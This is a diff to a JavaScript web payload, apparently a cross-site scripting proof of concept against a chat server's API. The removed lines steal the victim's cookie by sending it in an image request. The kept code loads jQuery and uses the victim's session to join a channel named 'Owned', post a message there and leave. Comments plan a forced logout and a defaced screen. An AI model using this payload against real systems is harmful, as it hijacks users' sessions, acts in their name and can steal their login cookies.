@@ -1,9 +1,3 @@
-// First thing, lets steal the cookie
-// var d = document;
-// var i = d.createElement("img");
-// i.src = 'http://localhost/s.jpg?c=' + encodeURI(d.cookie);
-// d.body.appendChild(i);
-
 // Load in JQuery
 var jquery = document.createElement('script');
 jquery.src = 'https://code.jquery.com/jquery-2.2.1.min.js';
@@ -12,6 +6,7 @@ document.head.appendChild(jquery);
 // Next, lets add ourselves to the channel "Owned"
 // POST /api/v1/channels/hash/join
 $.post('/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/join', function(data, status){
+	return 0;
 })
 
 // lets say we were owned in this channel
@@ -25,9 +20,9 @@ var data = {
 	"state":"loading"
 };
 $.post('/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/create', JSON.stringify(data), function(retData,status){		
+   return 0;
 });
 
 $.post('/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/leave', function(data, status){
+	return 0;
 });
-
-// Finally, lets log ourselves out, fade the screen to white, and write "Owned"
